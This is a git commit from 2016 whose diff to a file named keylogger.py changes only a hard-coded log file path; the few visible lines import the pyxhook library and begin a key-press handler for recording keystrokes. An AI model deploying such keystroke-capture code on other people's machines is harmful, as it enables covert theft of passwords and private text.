04202e93e3a9c3475d67829899d55593487050f1
jordlynn <snake.river52@gmail.com>
2016-11-16 05:35:48 -0800

    Python3 update, ord() fixed to recieve string

--- keylogger.py
+++ keylogger.py
@@ -13,7 +13,7 @@ grave key is found below Esc key
 
 import pyxhook
 #change this to your log file's path
-log_file='/home/aman/Desktop/file.log'
+log_file='/home/jordan/Desktop/file.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
